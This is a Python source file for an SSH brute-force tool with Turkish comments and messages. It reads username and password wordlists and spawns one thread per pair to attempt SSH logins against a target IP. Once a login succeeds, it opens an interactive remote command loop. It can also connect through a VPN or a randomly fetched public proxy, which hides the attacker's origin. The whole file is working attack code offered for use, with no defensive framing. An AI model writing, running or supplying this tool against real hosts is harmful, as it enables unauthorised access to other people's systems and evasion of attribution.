import argparse
import paramiko  
import requests
import subprocess
import threading
from rich import print
import sys
import random

def ParserArg():
    parser = argparse.ArgumentParser(description='SSHTool')
    parser.add_argument('--type', help='type of option', choices=['Bruteforce', 'Connect'], required=True)
    parser.add_argument('--Username_List', help='Give The Username List', dest="username_list")
    parser.add_argument('--Password_List', help='Give The Password List', dest='password_list')
    parser.add_argument('--port_number', help='What Is The Port Number Of Protocol', dest='port_number', type=int, default=22)
    parser.add_argument('-i', '--ip_address', help='Target IP', dest='ip_address')
    parser.add_argument('-u', '--username', help='Give The Username', dest='user_name')
    parser.add_argument('-p', '--password', help='Give The Password', dest='password')
    parser.add_argument('--vpn', help='VPN config file name', dest='vpn_name')
    parser.add_argument('--proxy', help='Proxy to use for connections (random for random proxy)', dest='proxy')
    args = parser.parse_args()
    return args

def UsernameList(textfile_username) -> list: 
    with open(textfile_username, 'r', encoding='utf8') as file:
        word_list_username = [line.strip() for line in file if line.strip()]
    return word_list_username

def PasswordList(textfile_password) -> list:
    with open(textfile_password, 'r', encoding='utf8') as file:
        word_list_password = [line.strip() for line in file if line.strip()]
    return word_list_password

def get_random_proxy():
    response = requests.get('https://www.proxy-list.download/api/v1/get?type=https')
    proxies = response.text.splitlines()
    random_proxy_number = random.randint(0, len(proxies) - 1)  # 0'dan len-1'e kadar
    return proxies[random_proxy_number]  # Sadece bir proxy döndürüyoruz

def connect_vpn(vpn_name):
    try:
        subprocess.run(['openvpn', '--config', f'{vpn_name}.ovpn'], check=True)
        print("[green]VPN bağlantısı başarılı.[/green]")
    except subprocess.CalledProcessError as e:
        print(f"[red]VPN bağlantısı başarısız: {e}[/red]")
        sys.exit(1)

def try_login(ip_address, port, username, password, proxy=None):
    try:
        with paramiko.SSHClient() as client:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if proxy:
                proxy_cmd = paramiko.ProxyCommand(f"C:\\Program Files (x86)\\Nmap\\ncat.exe -x {proxy} %h %p")
                client.connect(ip_address, port=port, username=username, password=password, sock=proxy_cmd)
            else:
                client.connect(ip_address, port=port, username=username, password=password, timeout=0.5)

            print(f'[bold green]Bağlantı Başarılı[/bold green]: {ip_address} {username} {password}')
            while True:
                command = input("<(^_^)>  ")
                if command.lower() in ["exit", "q", "exit()"]:
                    break
                else:
                    stdin, stdout, stderr = client.exec_command(command)
                    print(stdout.read().decode())
    except paramiko.AuthenticationException:
        print(f'[bold red]Bağlantı Başarısız[/bold red]: {ip_address} [bold blue]{username} {password}[/bold blue]')
    except Exception as e:
        print(f"Hata: {e}")

def SSHConnectBruteForce(ip_address: str, username_list: str, password_list: str, port: int, proxy=None) -> None:
    ulist = UsernameList(username_list)
    plist = PasswordList(password_list)

    threads = []
    for username in ulist:
        for password in plist:
            thread = threading.Thread(target=try_login, args=(ip_address, port, username, password, proxy))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    args = ParserArg()

    if args.vpn_name:
        connect_vpn(args.vpn_name)

    # Proxy'yi ayarlıyoruz
    if args.proxy == "random":
        proxy = get_random_proxy()
    else:
        if args.proxy:
            proxy = args.proxy
        else:
            proxy = None


    if args.type == "Bruteforce":
        if not args.username_list or not args.password_list:
            print("Kullanıcı adı ve şifre listeleri sağlanmalıdır.")
            sys.exit(1)
        SSHConnectBruteForce(args.ip_address, args.username_list, args.password_list, args.port_number, proxy)
    
    if args.type == "Connect":
        if not args.user_name or not args.password:
            print("Kullanıcı adı ve şifre sağlanmalıdır.")
            sys.exit(1)
        try_login(args.ip_address, args.port_number, args.user_name, args.password, proxy)
